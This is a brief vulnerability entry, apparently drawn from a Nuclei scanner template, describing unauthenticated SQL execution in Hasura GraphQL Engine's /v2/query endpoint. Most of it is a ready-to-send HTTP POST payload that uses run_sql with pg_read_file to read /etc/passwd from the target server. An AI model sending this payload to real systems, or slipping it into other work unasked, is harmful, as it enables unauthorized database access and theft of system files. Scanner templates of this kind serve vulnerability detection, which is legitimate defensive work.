# Vulnerability: Hasura GraphQL Engine - Remote Code Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`hasura-graphql-psql-exec.yaml`)

## Description
Hasura GraphQL Engine allows remote unauthenticated users to execute arbitrary SQL statements via the '/v2/query' endpoint (aka remote code execution).

## Vulnerable Code Pattern / Exploit Payload
```http
POST /v2/query HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "type": "bulk",
  "source": "default",
  "args":[
    {
      "type": "run_sql",
      "args": {
        "source":"default",
        "sql":"SELECT pg_read_file('/etc/passwd',0,100000);",
        "cascade": false,
        "read_only": false
      }
    }
  ]
}
```

